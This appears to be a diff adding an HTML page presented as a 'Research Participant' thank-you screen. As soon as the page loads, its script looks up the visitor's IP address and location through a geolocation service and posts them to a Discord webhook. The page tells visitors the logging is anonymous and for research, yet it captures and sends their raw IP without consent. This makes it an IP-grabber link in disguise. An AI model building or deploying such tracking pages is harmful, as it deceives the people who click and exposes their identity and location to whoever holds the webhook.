@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Research Participant</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f8ff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #333;
+        }
+        .container {
+            text-align: center;
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            max-width: 400px;
+        }
+        h1 {
+            color: #4CAF50;
+            font-size: 24px;
+        }
+        p {
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        .emoji {
+            font-size: 32px;
+        }
+        .loading {
+            display: none;
+            color: #666;
+            font-style: italic;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Thank You!</h1>
+        <div class="emoji">😊</div>
+        <p>Thank you for clicking this link! Your data will be used for research purposes :)</p>
+        <p class="loading" id="loading">Logging your visit anonymously...</p>
+    </div>
+
+    <script>
+        // Replace with your Discord webhook URL (keep secret; for GitHub Pages, consider a proxy endpoint if needed)
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN'; // Add as GitHub secret during build if using Actions, or use a serverless proxy
+
+        async function logVisitor() {
+            const loadingEl = document.getElementById('loading');
+            loadingEl.style.display = 'block';
+
+            try {
+                // Fetch geolocation data client-side (ipapi.co free tier: 1,000 req/day)
+                const geoResponse = await fetch('https://ipapi.co/json/');
+                const geoData = await geoResponse.json();
+
+                const logData = {
+                    ip: geoData.ip || 'Unknown',
+                    city: geoData.city || 'Unknown',
+                    country: geoData.country_name || 'Unknown',
+                    continent: geoData.continent_name || 'Unknown',
+                    timestamp: new Date().toISOString(),
+                    user_agent: navigator.userAgent // Optional: for more research context
+                };
+
+                // Send to Discord webhook as embed (your bot can receive this and handle stats)
+                const payload = {
+                    embeds: [{
+                        title: 'Research Log Entry',
+                        color: 0x4CAF50,
+                        fields: [
+                            { name: 'IP', value: logData.ip, inline: true },
+                            { name: 'City', value: logData.city, inline: true },
+                            { name: 'Country', value: logData.country, inline: true },
+                            { name: 'Continent', value: logData.continent, inline: true }
+                        ],
+                        timestamp: logData.timestamp,
+                        footer: { text: 'Individual visit log - Bot will aggregate stats' }
+                    }]
+                };
+
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                if (!response.ok) {
+                    console.error('Failed to send log:', response.status);
+                } else {
+                    console.log('Log sent successfully');
+                }
+            } catch (error) {
+                console.error('Error logging visit:', error);
+            } finally {
+                loadingEl.style.display = 'none';
+            }
+        }
+
+        // Log on page load
+        window.addEventListener('load', logVisitor);
+    </script>
+</body>
+</html>
